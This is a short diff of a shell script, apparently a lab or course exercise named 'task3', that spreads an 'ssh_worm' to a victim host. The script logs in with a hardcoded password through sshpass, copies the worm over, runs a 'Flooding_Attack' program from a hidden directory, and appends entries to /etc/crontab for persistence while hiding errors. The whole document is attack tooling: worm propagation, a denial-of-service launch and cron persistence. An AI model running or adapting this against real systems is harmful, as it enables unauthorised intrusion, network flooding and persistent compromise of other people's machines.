@@ -1,6 +1,6 @@
 # task3
 # input victim's IP address
-export SSHPASS='victim'
+export SSHPASS='victim123'
 
 read -p "Enter Victim IP Address: " IP_Address
 sshpass -e scp -r /home/victim/Desktop/ssh_worm victim@"$IP_Address":/home/victim/Desktop
@@ -41,7 +41,8 @@ ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
 
 echo "qq2"
 
-ssh victim@"$IP_Address" 'cd "$Hidden2" && ./Flooding_Attack;
+ssh victim@"$IP_Address" 'Hidden2="/home/victim/.Launch_Attack";
+			cd "$Hidden2" && ./Flooding_Attack;
 			echo "$(cat crontab.txt)" >> /etc/crontab> /dev/null 2>&1'
 
 echo "qq3"
